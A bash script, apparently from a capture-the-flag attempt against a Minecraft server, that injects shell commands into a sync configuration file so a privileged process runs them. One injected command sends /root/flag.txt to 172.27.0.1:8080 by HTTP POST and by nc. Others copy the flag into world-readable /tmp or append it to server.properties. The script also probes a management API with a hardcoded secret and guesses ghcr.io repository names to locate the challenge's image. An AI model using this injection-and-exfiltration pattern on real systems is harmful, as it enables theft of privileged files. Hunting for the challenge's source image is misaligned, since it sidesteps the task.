#!/bin/bash
echo "=== FAST FLAG EXTRACTION ===" echo 'talldwarf-sync-command=python3 -c "import urllib.request; f=open(\"/root/flag.txt\").read(); req=urllib.request.Request(\"http://172.27.0.1:8080/exfil\", data=f.encode(), headers={\"Content-Type\":\"text/plain\"}); urllib.request.urlopen(req)" || cat /root/flag.txt | nc 172.27.0.1 8080' > /opt/mc/config/sync-request.conf

echo "Config set, waiting 8 seconds..."
sleep 8

# Query management API for result
python3 << 'PY'
import urllib.request
import sys

secret = "dOpKC729CoeywJl9pSUPcAGmaiFhtkzd7CD0jJPQ"
endpoints = ["/exfil", "/result", "/flag", "/output", "/sync", "/data"]

for ep in endpoints:
    try:
        req = urllib.request.Request(f'http://172.27.0.1:8080{ep}', 
                                      headers={'X-Secret': secret})
        with urllib.request.urlopen(req, timeout=2) as r:
            data = r.read().decode()
            if data and data.strip():
                print(f"\n[FOUND at {ep}]: {data}")
                sys.exit(0)
    except Exception as e:
        pass

print("\n[No data at management API]")
PY

# Alternative: Try to write flag to player-readable location via base64
echo -e "\n=== ATTEMPT 2: Base64 encode to world-readable ===" 
echo 'talldwarf-sync-command=base64 /root/flag.txt > /tmp/f.b64 && chmod 666 /tmp/f.b64' > /opt/mc/config/sync-request.conf
sleep 8
if [ -f /tmp/f.b64 ]; then
    base64 -d /tmp/f.b64
    exit 0
fi

# Try writing directly to server.properties (Minecraft config)
echo -e "\n=== ATTEMPT 3: Write to server.properties ==="
echo 'talldwarf-sync-command=cat /root/flag.txt >> /opt/mc/server.properties' > /opt/mc/config/sync-request.conf
sleep 8
tail -5 /opt/mc/server.properties 2>/dev/null | grep -i tdho

# Check if ghcr.io is accessible and list repos
echo -e "\n=== CHECKING GHCR.IO ==="
python3 << 'PY2'
import urllib.request
import json

# Try common org names from CTF context
orgs = ["tdhos", "tdho-ctf", "tallholders", "ctf-tdho", "ctf7"]
for org in orgs:
    try:
        url = f"https://ghcr.io/v2/{org}/stolen-schematics-gameserver/tags/list"
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=3) as r:
            print(f"\n[GHCR FOUND]: {org}/stolen-schematics-gameserver")
            print(r.read().decode())
            break
    except:
        pass
PY2

echo -e "\n=== COMPLETE ==="
